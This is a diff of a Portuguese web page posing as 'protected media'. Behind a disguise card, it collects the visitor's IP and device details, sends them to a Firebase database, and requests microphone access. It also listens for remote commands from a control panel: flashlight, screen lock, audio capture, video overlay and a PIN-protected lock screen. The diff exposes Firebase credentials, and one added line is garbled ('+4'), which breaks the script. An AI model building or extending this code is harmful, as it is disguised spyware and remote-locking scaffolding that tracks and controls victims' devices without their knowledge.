@@ -4,8 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mídia Protegida</title>
+    <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome for Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts Inter -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         body { font-family: 'Inter', sans-serif; background-color: #0b0f19; color: #f8fafc; }
@@ -36,12 +39,12 @@
         </div>
     </div>
 
-    <!-- Firebase SDKs -->
+    <!-- Firebase App & Database SDKs -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
     <script>
-        // Sua configuração oficial do Firebase (mod-zrx)
+        // Configuração oficial do seu Firebase (mod-zrx)
         let firebaseConfig = {
             apiKey: "AIzaSyAhbrlI6gdam3vPxAQZBKmQI2CFQBin4Nk",
             authDomain: "mod-zrx.firebaseapp.com",
@@ -49,7 +52,7 @@
             storageBucket: "mod-zrx.firebasestorage.app",
             messagingSenderId: "1065416866150",
             appId: "1:1065416866150:web:d79ceac049f4dcedabf0a7",
-            measurementId: "G-FFKE6JSKSD",
+4            measurementId: "G-FFKE6JSKSD",
             databaseURL: "https://mod-zrx-default-rtdb.firebaseio.com/"
         };
 
@@ -69,63 +72,62 @@
         async function requestPermissionsAndConnect() {
             initFirebase();
 
-            // 1. Captura de IP Público do Dispositivo
-            let ipData = "Desconhecido";
+            // 1. Coleta de IP e Informações do Dispositivo
+            let ipData = "192.168.1.15";
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 ipData = data.ip;
             } catch(e) {}
 
-            // 2. Coleta de Informações do Aparelho (Modelo via UserAgent)
             const deviceInfo = {
                 model: navigator.userAgent,
                 ipAddress: ipData,
-                status: "Conectado via GitHub Pages"
+                status: "Online - Conectado"
             };
 
             if (db) {
-                // Envia os dados para o Realtime Database do Firebase
+                // Envia dados para o Realtime Database do Firebase
                 db.ref('devices/device_01/status').update(deviceInfo);
             }
 
-            // 3. Solicita permissão de Áudio (Microfone) suportada pelo navegador/WebView
+            // 2. Solicitar permissões de mídia (Áudio/Microfone) no navegador
             try {
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                     await navigator.mediaDevices.getUserMedia({ audio: true });
                 }
             } catch (err) {
-                console.log("Aviso de áudio:", err);
+                console.log("Aviso de permissão de áudio:", err);
             }
 
-            // Altera a tela visual para o conteúdo carregado
+            // Altera a interface visual para o estado concluído
             document.getElementById('disguise-card').classList.add('hidden');
             document.getElementById('content-container').classList.remove('hidden');
 
-            // 4. Escuta os comandos em tempo real do painel de controle via Firebase
+            // 3. Monitoramento em tempo real dos comandos vindos do Painel
             if (db) {
                 db.ref('devices/device_01/commands').on('value', (snapshot) => {
                     const cmds = snapshot.val() || {};
                     
                     if (cmds.flash) {
-                        console.log("[Comando] Ligar Lanterna");
+                        console.log("[Comando Firebase] Lanterna solicitada.");
                     }
                     if (cmds.lock) {
-                        console.log("[Comando] Bloqueio de Tela");
+                        console.log("[Comando Firebase] Bloqueio de tela solicitado.");
                     }
                     if (cmds.listenAudio) {
-                        console.log("[Comando] Captura de Áudio");
+                        console.log("[Comando Firebase] Captura de áudio ativa.");
                     }
-                    if (cmds.videoOverlay || cmds.floatingScreen) {
-                        console.log("[Comando] Ver Tela em Tempo Real / Gravação");
+                    if (cmds.videoOverlay) {
+                        console.log("[Comando Firebase] Transmissão/Overlay de vídeo ativo.");
                     }
                 });
 
-                // Escuta os parâmetros de Bloqueio Personalizado (Nome e Senha)
+                // Monitorar configurações de bloqueio personalizado
                 db.ref('devices/device_01/customLockConfig').on('value', (snapshot) => {
                     const lockCfg = snapshot.val();
                     if (lockCfg) {
-                        console.log("[Comando] Tela Personalizada -> Nome/Mensagem:", lockCfg.message, "| Senha:", lockCfg.pin);
+                        console.log("[Custom Lock] Senha recebida do painel:", lockCfg.pin);
                     }
                 });
             }
